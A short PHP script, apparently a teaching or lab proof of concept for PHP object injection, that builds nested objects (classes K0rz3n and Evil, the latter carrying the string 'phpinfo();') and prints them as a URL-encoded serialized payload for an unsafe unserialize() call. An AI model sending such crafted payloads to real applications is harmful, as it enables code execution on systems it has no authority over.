<?php

class K0rz3n {
	private $test;
	public function __construct() {
		$this->test=new Evil();
	}
}
class Evil {
	public function __construct() {
		$this->test2="phpinfo();";
	}
}
echo urlencode(serialize(new K0rz3n()));
